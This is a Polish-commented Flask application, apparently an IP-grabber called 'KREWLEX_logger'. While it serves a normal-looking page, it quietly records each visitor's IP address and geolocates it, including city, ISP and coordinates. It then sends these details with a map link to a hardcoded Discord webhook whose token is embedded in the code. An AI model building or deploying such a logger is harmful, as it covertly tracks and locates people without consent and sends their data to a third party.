from flask import Flask, request, redirect, render_template
from datetime import datetime
import requests

app = Flask(__name__)

def get_geo_details(ip):
    try:
        api_url = f"http://ip-api.com/json/{ip}?fields=status,message,country,city,isp,lat,lon,proxy,query"
        response = requests.get(api_url, timeout=5)
        data = response.json()
        if data.get("status") == "success":
            return data
    except:
        pass
    return None

def send_to_discord(ip_data, date_str):
    webhook_url = "https://discord.com/api/webhooks/1507450928393883868/If5swPkY7duepFfuMM4AGzh2CE7EJjDcaKuEUMTmKwx1o_R4R2DvjLo4J8p79vea2ptO"
    # Zabezpieczenie na wypadek, gdyby api_url zwróciło None
    ip = ip_data.get("query") if ip_data else "Nieznane"

    # POPRAWKA 2: Zmiana "if geo:" na "if ip_data:", bo tak nazywa się zmienna w tej funkcji
    if ip_data:
        location_str = f":round_pushpin: **Lokalizacja:** {ip_data.get('city')}, {ip_data.get('country')}\n:globe_with_meridians: **Dostawca:** {ip_data.get('isp')}"
        map_link = f"https://www.google.com/maps?q={ip_data.get('lat')},{ip_data.get('lon')}"
    else:
        location_str = "Brak danych o lokalizacji"
        map_link = "Brak"

    data = {
        "embeds": [
            {
                "title": ":hook:・ Nowe połączenie zarejestrowane┃KREWLEX_logger",
                "color": 16711680,
                "fields": [
                    {"name": "Adres IP", "value": f"`{ip}`", "inline": True},
                    {"name": "Data (Czas UTC / -2h PL)", "value": f"`{date_str}`", "inline": True}, # POPRAWKA 3: Zmiana z {date} na {date_str}
                    {"name": "Szczegóły", "value": location_str, "inline": False},
                    {"name": "Mapa", "value": f"[Kliknij tutaj, aby otworzyć Mapy Google]({map_link})", "inline": False},
                ]
            }
        ]
    }

    try:
        r = requests.post(webhook_url, json=data)
        print(f"Status Discorda: {r.status_code}")
    except Exception as e:
        print(f"Błąd wysyłki: {e}")

@app.route("/")

def index():

    # Pobieranie IP (obsługa proxy np. PythonAnywhere/Heroku)

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    if ip and "," in str(ip): # Czasami X-Forwarded-For zwraca listę IP
        ip = ip.split(",")[0].strip()


    # Pobieramy dane geolokalizacyjne z API
    geo_data = get_geo_details(ip)

    # Całkowicie uproszczony czas serwera (UTC) - bez żadnych dodatkowych obiektów
    surowy_czas = datetime.now()
    date_str = surowy_czas.strftime("%Y-%m-%d %H:%M:%S")

    # POPRAWKA 5: Zmiana send_ip(ip, date) na prawidłowe wywołanie funkcji z odpowiednimi danymi
    send_to_discord(geo_data, date_str)

    # Serwer renderuje plik index.html z folderu templates
    return render_template("index.html")

@app.route("/kliknij", methods=["POST"])
def kliknij():
    print("Użytkownik kliknął przycisk na stronie!")

    return """
    <h1 style='font-family:Arial;text-align:center;margin-top:100px;'>
        ✅ Sygnał odebrany pomyślnie przez serwer!
    </h1>
    <p style='text-align:center;font-family:Arial;'>
        Twoja aplikacja Flask działa poprawnie.
    </p>
    """

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
